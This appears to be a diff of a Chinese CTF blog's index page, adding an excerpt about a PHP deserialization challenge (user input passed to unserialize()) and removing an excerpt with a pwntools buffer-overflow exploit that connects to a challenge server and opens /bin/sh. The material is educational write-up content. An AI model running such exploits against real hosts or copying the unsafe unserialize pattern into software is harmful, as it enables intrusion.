@@ -141,6 +141,45 @@
     
     
     <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/04/02/%E3%80%90%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019%E3%80%91PHP/">
+        <p class="h4 index-header">【极客大挑战2019】PHP</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">这一题有两个地方卡住我了，第一个是没有想到备份名叫www.zip.第二个是public、protected与private在序列化时的区别。于是在url栏中输入www.zip得到网站源码，发现flag.php进行提交，错误。观看源码：index.php
+&lt;?php
+include &#39;class.php&#39;;
+$select = $_GET[&#39;select&#39;];
+$res=unserialize(@$select);
+?&gt;发现了关键代码，考的应该是反序列化漏洞，去看class.phpclass.php:
+&lt;?php
+ include &#39;flag.php&#39;;
+  error_reporting(0);
+  class Name{
+    private $username = &#39;nonono&#39;;
+    private $password = &#39;yesyes&#39;;
+
+    public function __construct($username,$password){
+        $thi</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-04-02&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
       <a href="/2020/03/28/%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87-user-ini/">
         <p class="h4 index-header">上传绕过  .user.ini</p>
         
@@ -409,47 +448,6 @@ intval($req[“number”])=intval(strrev($req[“num</div>
       <div>
         
           <i class="iconfont icon-riqi2"></i>&nbsp;2020-02-11&nbsp;&nbsp;
-        
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/02/10/CG-CTF-Stack-Overflow/">
-        <p class="h4 index-header">CG-CTF Stack Overflow</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">Stack Overflow先执行一下程序。通过观察可以从message里面找溢出点，发现第一个数组A长度为40但是可以输入60。并且n就在A数组的下面，因此我们可以通过溢出修改n的长度，并且写了/bin/sh下面是exp；
-from pwn import *
-
-re = remote(&#39;182.254.217.142&#39;,10001)
-
-fgets_plt = 0x080483D0
-data_addr = 0x0804A024
-re.sendline(&#39;1&#39;)
-
-payload1 = &#39;a&#39;*0x28 + p32(0x60) +&#39;/bin/sh&#39;
-
-re.sendline(payload1)
-
-payload2 = &#39;a&#39;*0x30 + &#39;aaaa&#39; + p32(0x080483f0) + &#39;aaaa&#39; +p32(0x0804A0AD)
-
-re.sendline(payload2)
-re.interactive()</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-02-10&nbsp;&nbsp;
         
         
         
